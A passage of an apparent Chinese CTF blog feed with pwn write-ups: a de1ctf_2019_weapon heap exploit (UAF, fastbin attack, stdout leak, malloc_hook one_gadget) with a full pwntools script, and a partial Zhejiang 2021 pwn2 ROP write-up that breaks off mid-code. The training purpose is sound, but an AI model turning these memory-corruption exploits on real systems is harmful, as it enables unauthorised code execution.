class="number">16</span>)-<span class="number">0x21b97</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0xe0</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">code_addr=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x79a</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&#x27;code_addr:&#x27;</span>+<span class="built_in">hex</span>(code_addr))</span><br><span class="line"></span><br><span class="line">shell=libc_addr+one[<span class="number">0</span>]</span><br><span class="line">success(<span class="string">&#x27;shell:&#x27;</span>+<span class="built_in">hex</span>(shell))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">8</span>:<span class="keyword">break</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack_addr&amp;<span class="number">0xffff</span>)+i).encode()+<span class="string">b&#x27;c%9$hn\n\0&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    val=shell&amp;<span class="number">0xffff</span></span><br><span class="line">    payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(val).encode()+<span class="string">b&#x27;c%35$hn\n\0&#x27;</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvline()</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    success(<span class="string">&#x27;debug:&#x27;</span>+<span class="built_in">hex</span>(val))</span><br><span class="line">    shell&gt;&gt;=<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">success(<span class="string">&#x27;one:&#x27;</span>+<span class="built_in">hex</span>(libc_addr+one[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;66666666\0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>de1ctf_2019_weapon writeup</title>
      <link href="/2021/11/07/de1ctf_2019_weapon/"/>
      <url>/2021/11/07/de1ctf_2019_weapon/</url>
      
        <content type="html"><![CDATA[<p>buu刷题记录—<a href="https://buuoj.cn/challenges#de1ctf_2019_weapon">de1ctf_2019_weapon</a></p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>checksec一波，保护全开，ida分析，发现时经典的堆菜单题目。有add，delete和edit操作，没有show函数，并且保护全开无法劫持got表。那么这题大概率是要用IO来泄露libc了。</p><p>add函数把堆块申请范围限制在了0x60以内，也就是说我们只能申请fastbin大小的堆块。edit函数就是中规中矩的按照之前的size修改堆块的内容。delete函数在堆块被free之后没有把指针置空存在UAF的漏洞。那么我们的思路大概就是先通过uaf进行堆块重叠然后修改size，free之后得到一个unsorted bin，然后再修改回fastbin将它申请到stdout附近通过IO泄露libc地址，最后再来一次fastbin attack劫持malloc hook放上onegadget 去getshell，这题需要用realloc 调整栈来适应onegadget，我们后面再说。</p><h2 id="泄露libc的地址"><a href="#泄露libc的地址" class="headerlink" title="泄露libc的地址"></a>泄露libc的地址</h2><p>因为地址都是未知的，所以一开始要通过释放两个相同大小的fastbin来让其中一个fastbin中留下另一个fastbin的地址，再通过修改最后一字节让fastbin的fd来让第二个chunk申请到可以造成堆重叠的地方便于我们修改size。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>))<span class="comment">#在合适的地方伪造chunk</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#提前free让fastbin中存在这个chunk</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/07/de1ctf_2019_weapon/1.png" alt="1"></p><p>可以看到第一个chunk的fd已经有了第四个chunk的地址，并且在第一个堆块中存在一个伪造的0x61作为fake chunk的size，所以接下来我们只要edit 0 \x50就能够产生fastbin attack了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x91</span>))<span class="comment">#修改第二个堆块的size</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#释放unsorted bin 让bin的fd中留下libc的地址</span></span><br><span class="line">edit(<span class="number">1</span>,p16(<span class="number">0xa5dd</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">0.5</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3c5600</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这一波操作就能成功泄露libc了，但是由于内存页是后三位对齐，我们填充是以字节为单位的，所以这里需要爆破一半个字节。</p><h2 id="劫持malloc-hook"><a href="#劫持malloc-hook" class="headerlink" title="劫持malloc_hook"></a>劫持malloc_hook</h2><p>这里没什么好说的，就是通过uaf的方法把堆块申请到malloc_hook-0x23的地方，写mallochook为reallochook，再把realloc hook写上对应的one gadget，这里需要注意的是realloc不一定直接就行了，需要适当跳过一些push或这pop之类的指令来调整栈中的0到合适的位置，这里我用了第2个onegadget，用realloc + 4的地方来调整栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#one=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(libc_addr+one[<span class="number">1</span>])+p64(libc_addr+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>最后附上爆破的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:</span><br><span class="line">        p=process(file_name)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29410</span>)</span><br><span class="line">        libc=ELF(<span class="string">&#x27;./libc/libc-2.23-buu64.so&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),libc,p</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,index,name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;name:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;idx :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content:&#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    elf,libc,p=conn(<span class="number">0</span>,<span class="string">&#x27;./de1ctf_2019_weapon&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x61</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x18</span>,<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">0</span>,p8(<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p16(<span class="number">0xa5dd</span>))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">7</span>,<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">0.5</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3c5600</span></span><br><span class="line">    success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#one=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">    one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(libc_addr+one[<span class="number">1</span>])+p64(libc_addr+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/2021/11/07/de1ctf_2019_weapon/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021浙江省赛pwn2复盘</title>
      <link href="/2021/11/06/zjctf2021%20pwn2/"/>
      <url>/2021/11/06/zjctf2021%20pwn2/</url>
      
        <content type="html"><![CDATA[<p>这题在比赛是没有做出来的，属于赛后复盘，但是感觉这题不该在比赛做不出来，因为赛后花了两小时就出了。</p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>首先checksec发现保护全开了，ida打开，主函数是一个while 1 循环且没有return，如果要栈溢出得在其它函数。首先ida分析有部分不到位，有一个很明显的值赋值指针，然后后面还有对指针之后的元素读取一个int型变量，很明显栈布局是这样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char buf[]</span><br><span class="line"></span><br><span class="line">char *ptr</span><br><span class="line">int size</span><br></pre></td></tr></table></figure><p>然后我们去混淆一下，去除那个指针刚好是31个int_64，把它改变一下就是char buf[248]，如下更方便分析(isnan函数是因为去除了alarm方便调试)</p><p><img src="/2021/11/06/zjctf2021%20pwn2/1.png" alt="1"></p><p>可以很明显的看到中间有两层检测，但是一旦不满足最外层那个检测那么就会循环输出<code>too easy</code>，因此我们看看这个判断是什么，这个判断的意思就是我们的指针只有在&gt;=缓冲区地址或者&lt;=rbp-0x220才允许执行下面的流程。因为栈是向低地址增长，所以第一个判断就是ptr要落在buf或者buf下面(栈底方向)。如果我们有机会修改ptr，那确实可以通过ptr任意写，而我们之前分析的是不能通过main函数溢出，所以往后面写没多大用处，那么我们看看第二个条件。意思大概就是如果不在buf下面，那么在上面也要离buf有一定距离，这个距离是rbp-0x220，然后buf最顶端距离rbp是0x120，所以指针不能落在(buf-0x100,buf)范围内因为判过有等号，所以判不过自然是开区间。</p><p>size只能0x100以内，观察类型发现判断的时候类型为unsigned，不能负溢。那么进入myputs，myread和mywrite查看。</p><p>myputs：单个字符输出，遇到\0停止输出。</p><p>mywrite：固定逐字节输出那么长的字节序列。</p><p>myread：也是逐字节读入那么长的序列，并且while  read(1)表示必须要读那么多的字节，但是注意他循环是从0，然后对size判断的时候加了等号，这就意味着能够多读入一个字节，存在off by one。</p><p>buf距离ptr刚好0x100字节，如果溢出一个字节那么可以溢出一个较大字节，使得等会通过这个指针输出的时候能够输出后面的栈内容。</p><h2 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h2><p>我们通过之前分析的内构造以下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span><span class="comment">#libc中寻找的</span></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/2.png" alt="2"></p><p>可以看到后面输出了很多东西，但是因为栈不存在内存页对齐的说法，所以最后一个字节改大之后能输出多少东西全凭运气。我们可以在输入之后用gdb attach去查看此时栈的情况看看能泄露什么东西。由于没有去符号表，因此为了方便定位代码我们直接在后面加上b mywrite。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/3.png" alt="3"></p><p>圈出来的是指针末尾被改了的情况，然后三个箭头是可以泄露的东西，分别能泄露栈，libc和程序的加载基址。但是如果buf本身所在位置的最低字节就是e0,f0之类的那可能泄露不了这么多东西，所以这一点也是看脸的。那么我们如何接收泄露的数据呢？</p><p>首先我们第一个泄露的地址应该是ptr，但是ptr被我们改过，我们并具体泄露出这个buf在哪个位置。所以这个我们不考虑，我们接受后面的栈地址，计算一下泄露地址和buf的偏移得到buf地址。后面的没啥好说的，就是开了pie之后程序加载基址不知道具体会在哪，不过据我观察它大部分高字节是55，有时候是56，所以我们就以55判断吧。但是为了调试方便我们选择先关闭aslr调试，具体细节就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>关闭之后开了aslr的程序固定加载在0x555555554000上面，所以我们选择以四个字节的55来判断是否有没有泄露到程序加载基址，等到打远程的时候调回来就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span><span class="comment">#buf_addr-8</span></span><br><span class="line"><span class="comment">#因为一开始指向劫持这个忽略了条件不允许，这里到后来也没改，问题不大，之后在引用这个值的时候+8就完事了。</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span><span class="comment">#libc_base</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>*<span class="number">4</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr<span class="comment">#用的是libc的gadget，用本身的gadget加上code_base即可</span></span><br></pre></td></tr></table></figure><p>这里我关了aslr的调试结果</p><p><img src="/2021/11/06/zjctf2021%20pwn2/4.png" alt="4"></p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>泄露了这三个基址之后，我们就要考虑在哪里劫持程序流了。got表因为开了保护无法劫持，我们只能劫持函数，唯一具有输入功能的就是my_read函数，所以肯定是在这里溢出。我们之前讨论过我们的ptr能劫持的位置是有限制的。</p><p>如果我们把指针刚好劫持在buf-0x100，然后读入0x100字节的数据能否溢出呢？答案当然是可以的，因为buf是main函数的栈顶了，再上去就是其它函数的栈帧了，就算这0x100字节不能碰到buf，那碰到上面函数的返回地址还是可以的。这便是这题的巧妙之处了，这里我想了很久。但是要注意，我们是逐字节输入的，并不是一口气输入完的，所以里面的一些变量不能破坏。这里具体要自己调试了，它中间好像有把循环截止条件的那个数，也就是第三个参数放到栈上，因为我覆盖过去直接就无了，循环直接退出了。还有一个就是jmp 的时候也有用到栈上的地址跳转，因为我使用e覆盖的，然后我那个指令直接就跳到了0xXXXXX65的地方，然后就crash了，所以这个地方大概率是要放上正确的跳转地址的。因为是逐字节填充，所以这里是肯定劫持不了程序的，我们只能尽量不破坏它程序的执行，我们的最终目标其实也就填上那8个字节其它是什么其实无所谓，只要能成功劫持那八个字节，我们就能控制程序流。</p><h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h3><p>这题可以执行system(“/bin/sh”)，因此我们先构造rop链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=...+p64(pop_rdi_ret)+p64(sh)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>pop_rdi_ret的gadget可以使用elf的，也可以用库的，这个看自己心情，我因为一开始没有选择接受程序基址就选择了libc的gadget。因为我们只能劫持八个字节，那么执行了pop_rdi_ret之后程序ret到哪里了呢，我们先画出当时整个栈结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i</span><br><span class="line">main&#x27;s rbp</span><br><span class="line">ret_addr</span><br><span class="line">buf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ptr</span><br><span class="line">size</span><br><span class="line">canary</span><br><span class="line">libc_start_main&#x27;s rbp</span><br><span class="line">ret_addr</span><br></pre></td></tr></table></figure><p>可以看出来，返回地址后面紧跟着的就是buf，buf我们一开始是可控的，但是一开始我们并不知道system和/bin/sh的地址，因此这里我们需要选择把指针恢复填上p64(sh)+p64(system_addr)，这样当劫持my_read函数的时候就会形成rop链。那么接下来要如何把指针劫持回去呢，因为我们用的是\xff字节去填充了最低位，现在我们如果写，将不会从buf的地方开始而是会从(buf_addr|0xff)，这也是一开始选取\xff字节的目的，因为它八个都是1，在最后计算的时候直接或上去就可以了，如果选取其它的可能就要进行一些复杂的运算，比如\xfe字节你可能就得这么写。</p><p>(buf_addr&amp;0xffffffffff00)|0xfe</p><p>这个应该都能理解吧，因为我们是覆盖操作，但是如果覆盖位数都为1就可以直接或上去，不用再&amp;清除低位字节。</p><p>而我们的目标地址在buf_addr+0x100，所以只需要算这个偏移就行了。这偏移也是很好算的，我们从buf_addr|0xff开始写，然后终点是buf_addr+0x100，两个一减就能算出填充字节的位数了，然后再加上buf_addr指针给他写回去。好了之后呢，就是开头放上p64(sh)+p64(system_addr)然后依然要溢出ff字节，不然只能溢出一个字节不足以能肯定改变指针到我们想的地方。所以重复一开始的操作溢出为0xff，然后再劫持到buf_addr-0x100的地方去。</p><p>改回指针并且重写再次溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))<span class="comment">#再次注意一下，我的stack_addr是buf_addr-8</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)<span class="comment">#这里需要加个ret平衡栈，后面注意到了就知道在这里加一个就行</span></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))<span 